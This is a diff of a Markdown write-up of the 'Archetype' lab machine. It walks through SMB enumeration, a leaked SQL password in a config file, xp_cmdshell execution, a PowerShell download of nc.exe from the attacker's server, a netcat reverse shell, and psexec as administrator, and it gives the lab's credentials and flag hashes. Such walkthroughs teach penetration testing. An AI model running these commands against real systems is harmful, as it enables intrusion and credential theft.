@@ -1,12 +1,17 @@
+# Archetype
+
+## Ifconfig
+
+```
 inet 10.10.14.69  netmask 255.255.254.0
 inet6 fe80::d484:44d2:fd97:c02c
-
-# Archetype
+```
 
 ## nmap
 
-sudo nmap -sC -sV -A 10.10.10.27
+> sudo nmap -sC -sV -A 10.10.10.27
 
+```
 PORT     STATE SERVICE      VERSION
 135/tcp  open  msrpc        Microsoft Windows RPC
 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
@@ -28,8 +33,8 @@ Host script results:
 |   3.1.1: 
 |_    Message signing enabled but not required
 | smb-security-mode: 
-|   account_used: "guest"
-|   authentication_level: "user"
+|   account_used: guest
+|   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 | smb2-time: 
@@ -37,19 +42,45 @@ Host script results:
 |_  start_date: N/A
 | smb-os-discovery: 
 |   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
-|   Computer name: "Archetype"
+|   Computer name: Archetype
 |   NetBIOS computer name: ARCHETYPE\x00
 |   Workgroup: WORKGROUP\x00
 |_  System time: 2021-09-19T01:27:52-07:00
 |_clock-skew: mean: 1h49m02s, deviation: 3h07m52s, median: 25m01s
+```
 
+## Smbclient
+
+- List sharename
+
+> smbclient -L 10.10.10.27
+
+```
 Sharename       Type      Comment
 ---------       ----      -------
 ADMIN$          Disk      Remote Admin
 backups         Disk      
 C$              Disk      Default share
 IPC$            IPC       Remote IPC
+```
 
+- Attempt to login
+
+> smbclient //10.10.10.27/ADMIN$
+
+```
+tree connect failed: NT_STATUS_ACCESS_DENIED
+```
+
+> smbclient //10.10.10.27/backups
+
+login success
+
+- Get prod.dtsConfig info
+
+> allinfo prod.dtsConfig
+
+```
 altname: PROD~1.DTS
 create_time:    一  1月 20 20時20分57秒 2020 CST
 access_time:    一  1月 20 20時23分02秒 2020 CST
@@ -57,9 +88,11 @@ write_time:     一  1月 20 20時23分02秒 2020 CST
 change_time:    一  1月 20 20時23分18秒 2020 CST
 attributes: RA (21)
 stream: [::$DATA], 609 bytes
+```
 
-prod.dtsConfig in backups
+- Find prod.dtsConfig in backups
 
+```
 <DTSConfiguration>
     <DTSConfigurationHeading>
         <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
@@ -68,32 +101,70 @@ prod.dtsConfig in backups
         <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
     </Configuration>
 </DTSConfiguration>
+```
+## Impacket
 
+- Format
+
+```
 [[domain/]username[:password]@]<targetName or address>
+```
 
-impacket-mssqlclient sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
+> impacket-mssqlclient sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
 
-sp_configure make sure xp_cmdshell is opened
+- Use sp_configure make sure xp_cmdshell is opened
 
-local runs python3 -m http.server to upload nc.exe makes remote wget
+- Get command from remote
 
-xp_cmdshell powershell wget http://10.10.14.69:8000/nc.exe -outfile %TEMP%\nc.exe
+*local upload nc.exe* 
 
-nc -lvnp 5678
+http server default port 8000
 
-xp_cmdshell powershell %TEMP%\nc.exe -nv 10.10.14.69 5678 -e cmd.exe
+> python3 -m http.server 
 
+*remote get nc.exe*
+
+> xp_cmdshell powershell wget http://10.10.14.69:8000/nc.exe -outfile %TEMP%\nc.exe
+
+*local listen port*
+
+> nc -lvnp *port*
+
+*remote give cmd.exe privilege*
+
+> xp_cmdshell powershell %TEMP%\nc.exe -nv 10.10.14.69 *port* -e cmd.exe
+
+```
 user.txt
 3e7b102e78218e935bf3f4951fec21a3
+```
 
-powershell history.txt
+## Get powershell history file
+
+> cd /
+
+- Search any end at history.txt's file
+
+> dir/s *history.txt
+
+```
 C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+```
 
+- type the content
+
+```
 net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
 exit
+```
 
-impacket-psexec administrator@10.10.10.27
-or impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.10.10.27
+> impacket-psexec administrator@10.10.10.27
 
+or
+
+> impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.10.10.27
+
+```
 root.txt
 b91ccec3305e98240082d4474b848528
+```
